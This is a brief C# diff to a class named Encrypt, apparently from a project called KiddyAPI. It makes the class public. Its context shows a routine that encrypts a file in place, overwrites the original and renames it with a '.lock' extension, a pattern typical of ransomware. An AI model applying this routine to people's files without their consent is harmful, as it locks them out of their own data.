@@ -7,7 +7,7 @@ using System.IO;
 
 namespace KiddyAPI.Crypt
 {
-    class Encrypt
+    public class Encrypt
     {
         public static void EncryptFile(string file, byte[] key)
         {
@@ -15,6 +15,7 @@ namespace KiddyAPI.Crypt
             byte[] bytesEncrypted = Handler.Encrypt(bytesToBeEncrypted, key);
             File.WriteAllBytes(file,bytesEncrypted);
             File.Move(file, file + ".lock");
+            
         }
     }
 }
